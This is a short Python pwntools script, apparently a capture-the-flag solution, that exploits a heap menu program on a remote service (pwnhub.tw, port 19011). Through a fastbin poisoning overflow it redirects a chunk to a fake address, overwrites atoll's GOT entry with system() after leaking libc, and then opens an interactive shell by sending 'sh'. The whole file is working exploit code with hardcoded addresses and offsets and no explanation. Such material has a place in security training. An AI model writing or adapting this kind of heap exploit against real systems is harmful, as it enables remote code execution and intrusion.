#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 19011

r = remote(host,port)


def allocate(size):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def fill(idx,data):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(data)

context.arch = "amd64"


allocate(0x60)
allocate(0x60) # 1
free(1)
fake = 0x6020bd
fill(0,"a"*0x60 + p64(0) + p64(0x71) + p64(fake))
allocate(0x60 ) #1
allocate(0x60) #2
heaparray = 0x6020e0
atoll_got = 0x602058
fill(2,"a"*3 + p64(heaparray)  + p64(0) + p64(atoll_got)  )
show(0)
r.recvuntil(":")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x36eb0
print hex(libc)
system = libc + 0x45390
fill(0,p64(system))
r.recvuntil(":")
r.sendline("sh")
r.interactive()
